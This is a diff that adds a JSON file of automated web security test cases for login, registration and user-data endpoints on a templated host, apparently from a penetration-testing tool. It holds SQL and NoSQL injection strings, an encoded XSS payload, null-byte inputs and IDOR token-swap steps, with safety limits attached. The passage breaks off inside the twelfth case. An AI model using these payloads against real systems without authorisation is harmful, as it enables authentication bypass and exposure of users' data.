@@ -1,0 +1,1369 @@
+{
+  "test_cases": [
+    {
+      "id": "TC-H-001",
+      "hypothesis_id": "H-001",
+      "base_url": "http://{{host}}",
+      "method": "POST",
+      "endpoint": "/login",
+      "parameter": "user",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "user=normaluser"
+            }
+          ],
+          "description": "Baseline valid-looking username value; keep other fields omitted to match observed model",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "user=admin' OR '1'='1"
+            }
+          ],
+          "description": "Probe injection-like input to detect auth bypass or different server responses",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "user=%00"
+            }
+          ],
+          "description": "Edge binary/null byte injection to provoke parsing differences or errors",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "No authentication required; ensure no session cookies are set in the request environment",
+          "custom_logic": "Ensure client sends only minimal default headers and no Authorization or Cookie header"
+        },
+        {
+          "type": "csrf_token",
+          "description": "If endpoint requires CSRF token, obtain token via GET /login and include as form field named csrf or X-CSRF-Token header",
+          "extract_from": "/login GET response body or headers",
+          "bind_to": "header:X-CSRF-Token or body:csrf_token"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Compare response status code and body length of probe and exploit to benign baseline. Trigger if status code becomes one of [200,302] when baseline is not, or body length changes by >=20%",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              302
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "Search response body for authentication-related error messages, stack traces, SQL/NoSQL keywords, or server error strings (e.g., exception, stack trace, error at, syntax error). Trigger on any match compared to baseline containing none",
+          "threshold": {},
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Requests assume form field 'user' only; the login may also accept 'pass' field — tests leave it blank to remain idempotent",
+      "tags": [
+        "authn_bypass",
+        "injection_probe"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "TC-H-002",
+      "hypothesis_id": "H-002",
+      "base_url": "http://{{host}}",
+      "method": "POST",
+      "endpoint": "/login",
+      "parameter": "pass",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "pass=correcthorsebatterystaple"
+            }
+          ],
+          "description": "Baseline plausible password value",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "pass=' OR '1'='1"
+            }
+          ],
+          "description": "Probe logical tautology attempt in password to detect bypass or error differences",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "pass=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          ],
+          "description": "XSS-like payload in password to detect reflected error messages or stack traces (safe probe)",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "No authentication required; ensure no session cookies are set",
+          "custom_logic": "Do not submit valid username to avoid creating account lockout side-effects; only altering pass field"
+        },
+        {
+          "type": "csrf_token",
+          "description": "If CSRF required, fetch token from GET /login and include",
+          "extract_from": "/login GET response body or headers",
+          "bind_to": "header:X-CSRF-Token or body:csrf_token"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "If probe or exploit response returns 200 or 302 while baseline is non-success, or body length differs by >=20% relative to baseline, flag anomaly",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              302
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "Detect authentication error messages, detailed stack traces, or DB error keywords in responses for probe/exploit compared to baseline",
+          "threshold": {},
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 2,
+      "delay_between_requests": 0.5,
+      "notes": "Keep username field absent to avoid logging into real account; if server requires both fields, tests may need observation first",
+      "tags": [
+        "authn_bypass",
+        "error_leak"
+      ],
+      "estimated_duration": 60
+    },
+    {
+      "id": "TC-H-003",
+      "hypothesis_id": "H-003",
+      "base_url": "http://{{host}}",
+      "method": "POST",
+      "endpoint": "/login",
+      "parameter": "user,pass",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "user=testuser&pass=testpass"
+            }
+          ],
+          "description": "Baseline valid-seeming credential pair",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "user=admin'--&pass=anything"
+            },
+            {
+              "location": "body",
+              "value": "user=admin&pass=' OR '1'='1"
+            }
+          ],
+          "description": "Probe combinations attempting SQL-like bypass patterns in user or pass",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "user=\\u0000&pass=\\u0000"
+            }
+          ],
+          "description": "Null byte pair to provoke parsing differences or authentication anomalies",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "No prior auth required; ensure test environment not rate-limited or lockout-prone",
+          "custom_logic": "Monitor for account lockout responses and stop if observed"
+        },
+        {
+          "type": "csrf_token",
+          "description": "If CSRF required, obtain from GET /login and include in form",
+          "extract_from": "/login GET response body or headers",
+          "bind_to": "header:X-CSRF-Token or body:csrf_token"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "If any crafted credential pair returns success codes [200,302] while baseline fails, or body length changes by >=20% compared to baseline, flag as potential bypass",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              302
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "Detect detailed authentication error messages, DB/driver stack traces or parsing errors when using crafted pairs compared to baseline",
+          "threshold": {},
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 40
+      },
+      "max_retries": 3,
+      "delay_between_requests": 0.5,
+      "notes": "Watch for rate limits or lockouts; halt after detecting account lockout",
+      "tags": [
+        "authn_bypass",
+        "combo_probe"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "TC-H-004",
+      "hypothesis_id": "H-004",
+      "base_url": "http://{{host}}",
+      "method": "POST",
+      "endpoint": "/register",
+      "parameter": "email",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "email=user@example.com"
+            }
+          ],
+          "description": "Baseline normal email value",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "email={\"$ne\":\"\"}@example.com"
+            }
+          ],
+          "description": "NoSQL-like operator injection probe to elicit error or different behavior",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "email=\\' || this.password.length > 0 || \\'@example.com"
+            }
+          ],
+          "description": "More aggressive crafted value to provoke parsing issues or errors (safe probe)",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "No auth required; ensure tests not creating repeated real accounts to avoid pollution",
+          "custom_logic": "Use disposable or uniquely generated emails per attempt when moving to exploit tier to reduce collisions"
+        },
+        {
+          "type": "csrf_token",
+          "description": "If CSRF token present, include valid token obtained from GET /register",
+          "extract_from": "/register GET response body or headers",
+          "bind_to": "header:X-CSRF-Token or body:csrf_token"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "error_signature",
+          "condition": "Compare probe/exploit responses for NoSQL/driver error keywords, stack traces, or JSON parse errors not present in baseline",
+          "threshold": {},
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "If response code differs from baseline or body length changes by >=30% for probe/exploit, flag potential input parsing/execution issues",
+          "threshold": {
+            "body_length_delta_pct": 30.0,
+            "expected_codes": [
+              200,
+              201,
+              400,
+              500
+            ]
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 25
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Use unique emails for exploit tier to avoid creating duplicate accounts; if account creation occurs, do not perform follow-up destructive actions",
+      "tags": [
+        "nosql_injection",
+        "input_validation"
+      ],
+      "estimated_duration": 90
+    },
+    {
+      "id": "TC-H-005",
+      "hypothesis_id": "H-005",
+      "base_url": "http://{{host}}",
+      "method": "POST",
+      "endpoint": "/register",
+      "parameter": "password",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "password=Str0ngP@ssw0rd!"
+            }
+          ],
+          "description": "Baseline normal password value",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "password=' OR 1=1 -- "
+            },
+            {
+              "location": "body",
+              "value": "password=admin')/*"
+            }
+          ],
+          "description": "Probe for parsing errors or acceptance anomalies in password handling",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "password=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          ],
+          "description": "Payload to detect reflected error messages or improper handling (safe)",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "No auth required; avoid creating many valid accounts — use disposable identifiers if creating accounts",
+          "custom_logic": "Stop if account gets created to prevent test environment pollution"
+        },
+        {
+          "type": "csrf_token",
+          "description": "If endpoint protected by CSRF, fetch token from GET /register and include",
+          "extract_from": "/register GET response body or headers",
+          "bind_to": "header:X-CSRF-Token or body:csrf_token"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Flag if responses for probe/exploit return unexpected success codes [200,201,302] or body length changes by >=20% relative to benign baseline",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200,
+              201,
+              302
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "Detect password-processing errors, stack traces, or backend error messages in probe/exploit responses not present in baseline",
+          "threshold": {},
+          "weight": 0.8
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Avoid creating persistent accounts; if registration succeeds during tests, cease further requests",
+      "tags": [
+        "authn_bypass",
+        "error_leak"
+      ],
+      "estimated_duration": 90
+    },
+    {
+      "id": "TC-H-006",
+      "hypothesis_id": "H-006",
+      "base_url": "http://{{host}}",
+      "method": "POST",
+      "endpoint": "/register",
+      "parameter": "email,password",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "email=user_alpha_{{ts}}@example.com&password=SafePass123!"
+            }
+          ],
+          "description": "Baseline registration attempt using unique email template; tester must replace {{ts}} with timestamp to avoid collisions",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "email={\"$regex\":\".*\"}@example.com&password=SafePass123!"
+            },
+            {
+              "location": "body",
+              "value": "email=user_beta_{{ts}}@example.com&password=' OR '1'='1"
+            }
+          ],
+          "description": "Probe NoSQL/SQL-like operator in email and tautology in password to detect acceptance differences",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body",
+              "value": "email=admin@test.com&password=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          ],
+          "description": "Exploit-tier crafted inputs to provoke parsing or acceptance differences (use unique emails to avoid creating real admin accounts)",
+          "encoding": "application/x-www-form-urlencoded; charset=UTF-8",
+          "content_type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/x-www-form-urlencoded"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "No auth required; ensure test runner substitutes unique timestamps into payloads to avoid duplicate account creation",
+          "custom_logic": "If an account is successfully created, stop further registration attempts to avoid excessive accounts (safety: destructive_ok=false)"
+        },
+        {
+          "type": "csrf_token",
+          "description": "If CSRF token present, fetch from GET /register and include",
+          "extract_from": "/register GET response body or headers",
+          "bind_to": "header:X-CSRF-Token or body:csrf_token"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "All payload responses must be compared to benign baseline. If status codes differ to any of [200,201,400] or body length changes by >=25%, mark anomaly",
+          "threshold": {
+            "body_length_delta_pct": 25.0,
+            "expected_codes": [
+              200,
+              201,
+              400
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If response body size changes by >=40% between baseline and probe/exploit indicating account creation vs error, and status codes align, mark as state change",
+          "threshold": {
+            "body_length_delta_pct": 40.0
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "all",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 1,
+      "delay_between_requests": 2.0,
+      "notes": "Because this test can create accounts, keep max_requests low and use unique identifiers. Stop on successful account creation.",
+      "tags": [
+        "business_logic",
+        "registration"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "TC-H-007",
+      "hypothesis_id": "H-007",
+      "base_url": "http://{{host}}",
+      "method": "GET",
+      "endpoint": "/user_info/",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Baseline fetch of /user_info/ as authenticated user — requires obtaining auth token via login prerequisite",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Fetch /user_info/ for other users by manipulating authentication token or session to another user's context if token format allows user-id change (do not brute force)",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [],
+          "description": "If user_id is reflected in token format and can be safely changed without guessing credentials, attempt single controlled token swap to access another user's info. Do not iterate across IDs",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Obtain authenticated_user_token_required via a valid account login using POST /login. Extract token from response (cookie or JSON)",
+          "extract_from": "/login POST response headers or body",
+          "bind_to": "header:Cookie or header:Authorization"
+        },
+        {
+          "type": "custom",
+          "description": "Testing other-user access requires a second distinct account to compare responses. Create a second test account via /register if not present, then log in to obtain its token",
+          "extract_from": "/register POST response or subsequent /login",
+          "bind_to": "header:Cookie:other_user_session or header:Authorization:other_token",
+          "custom_logic": "Do not attempt to access highly privileged accounts; only use two controlled test accounts"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF not required for GET"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Compare status codes when requesting own user_info vs using other user's token or manipulated token. If other-user request returns 200 while baseline returns 200 but with different content, or returns 200 where expected 401/403, flag",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403,
+              404
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If response body length for other-user request differs by >=30% (more fields or sensitive data) compared to baseline own-user response, flag potential IDOR/sensitive exposure",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 50
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "All auth tokens must be from controlled test accounts. Do not attempt to enumerate users; perform single comparison only.",
+      "tags": [
+        "idor",
+        "authorization"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "TC-H-008",
+      "hypothesis_id": "H-008",
+      "base_url": "http://{{host}}",
+      "method": "GET",
+      "endpoint": "/user_likes/",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Baseline GET /user_likes/ with authenticated user's token",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Using another controlled user's token, perform single GET to /user_likes/ to compare results",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [],
+          "description": "If token allows altering owner-id without credentials (e.g., JWT with modifiable 'sub'), perform single non-iterative token modification to test access (only if safe)",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Obtain authenticated_user_token_required for primary test account via POST /login; extract cookie or Authorization header",
+          "extract_from": "/login POST response headers or body",
+          "bind_to": "header:Cookie or header:Authorization"
+        },
+        {
+          "type": "login",
+          "description": "Obtain second test account token for comparison; create via /register if needed",
+          "extract_from": "/register POST or /login POST",
+          "bind_to": "header:Cookie:other_user_session or header:Authorization:other_token"
+        },
+        {
+          "type": "csrf_token",
+          "description": "CSRF not required for GET"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "If other-user request returns 200 where authorization should block (baseline expected 401/403), flag anomaly",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If other-user response body length differs by >=30% indicating exposure of additional likes, flag potential IDOR",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 50
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Only compare two controlled accounts; do not enumerate or probe many user IDs",
+      "tags": [
+        "idor",
+        "sensitive_data"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "TC-H-009",
+      "hypothesis_id": "H-009",
+      "base_url": "http://{{host}}",
+      "method": "GET",
+      "endpoint": "/user_loves/",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Baseline GET /user_loves/ with authenticated token",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Single comparison using a second controlled account token to detect if loves are exposed across users",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [],
+          "description": "If safe token modification allows, perform one controlled token alteration to test access to another user's loves (no iteration)",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Obtain authenticated tokens for two controlled accounts via POST /login and bind to Authorization or Cookie headers",
+          "extract_from": "/login POST response headers or body",
+          "bind_to": "header:Cookie and header:Cookie:other_user_session"
+        },
+        {
+          "type": "csrf_token",
+          "description": "Not required for GET"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "If using other user's token returns 200 when baseline expected 401/403, flag",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If other-user response body size differs by >=30% compared to baseline indicating additional data exposure, flag",
+          "threshold": {
+            "body_length_delta_pct": 30.0
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 50
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Do not attempt to access privileged accounts; single comparison only",
+      "tags": [
+        "idor"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "TC-H-010",
+      "hypothesis_id": "H-010",
+      "base_url": "http://{{host}}",
+      "method": "GET",
+      "endpoint": "/all_users/",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Baseline GET /all_users/ using authenticated non-admin user token",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Repeat GET with same token and compare; if app expected to restrict, also test with admin token if available in scope (only controlled admin)",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [],
+          "description": "If endpoint returns large payloads for non-admin, that's potential sensitive exposure — no exploit payloads required",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Obtain authenticated_user_token_required for regular user via POST /login and, if available and permitted, admin_role test token for comparison",
+          "extract_from": "/login POST response headers or body",
+          "bind_to": "header:Cookie and header:Authorization:admin_token",
+          "custom_logic": "Only use controlled admin credentials provided by scope; do not attempt privilege escalation"
+        },
+        {
+          "type": "csrf_token",
+          "description": "Not required for GET"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "If response body size for non-admin exceeds baseline by >=50% or contains array of user objects where baseline expected limited data, flag sensitive data exposure",
+          "threshold": {
+            "body_length_delta_pct": 50.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "If non-admin request returns 200 where expected 401/403, or admin-only endpoint accessible, flag",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403
+            ]
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Do not enumerate or export user lists beyond single fetch; treat large responses as indicator and escalate to manual review",
+      "tags": [
+        "sensitive_data_exposure",
+        "authorization"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "TC-H-011",
+      "hypothesis_id": "H-011",
+      "base_url": "http://{{host}}",
+      "method": "GET",
+      "endpoint": "/total_money/",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Baseline GET /total_money/ using authenticated token for regular user",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "If privileged access expected, test with non-privileged token and compare to privileged token if available in-scope (single comparison)",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [],
+          "description": "No exploit payloads; observe response content for monetary values exposure",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Obtain authenticated tokens for regular and privileged accounts in-scope via POST /login",
+          "extract_from": "/login POST response headers or body",
+          "bind_to": "header:Cookie and header:Authorization:admin_token_if_available",
+          "custom_logic": "Only use privileged tokens if provided by scope; do not attempt to escalate privileges"
+        },
+        {
+          "type": "csrf_token",
+          "description": "Not required for GET"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "If response body for non-privileged user contains monetary aggregates or detailed per-user balances and size increases by >=50% relative to expected limited output, flag sensitive exposure",
+          "threshold": {
+            "body_length_delta_pct": 50.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "If non-privileged request returns 200 where expected 401/403, flag improper access control",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403
+            ]
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 20
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Do not exfiltrate sensitive numeric data; capture only indicators (sizes, presence) and escalate for manual review",
+      "tags": [
+        "sensitive_data_exposure"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "TC-H-012",
+      "hypothesis_id": "H-012",
+      "base_url": "http://{{host}}",
+      "method": "GET",
+      "endpoint": "/user_pictures/",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Baseline GET /user_pictures/ with authenticated user token",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "probe",
+          "payloads": [],
+          "description": "Single GET using another controlled user's token to compare returned list sizes and objects",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        },
+        {
+          "tier": "exploit",
+          "payloads": [],
+          "description": "If token modification permits owner-id change safely, perform one controlled token modification to test exposure (no enumeration)",
+          "content_type": "application/json; charset=utf-8",
+          "header": []
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Obtain authenticated tokens for two controlled accounts via POST /login",
+          "extract_from": "/login POST response headers or body",
+          "bind_to": "header:Cookie and header:Cookie:other_user_session"
+        },
+        {
+          "type": "csrf_token",
+          "description": "Not required for GET"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "response_length_diff",
+          "condition": "If other-user response contains >=40% larger payload or extra image entries compared to baseline, flag exposure",
+          "threshold": {
+            "body_length_delta_pct": 40.0
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "If other-user request returns 200 where baseline expected restricted (401/403), flag authorization bypass",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403
+            ]
+          },
+          "weight": 0.9
+        }
+      ],
+      "pass_logic": "any",
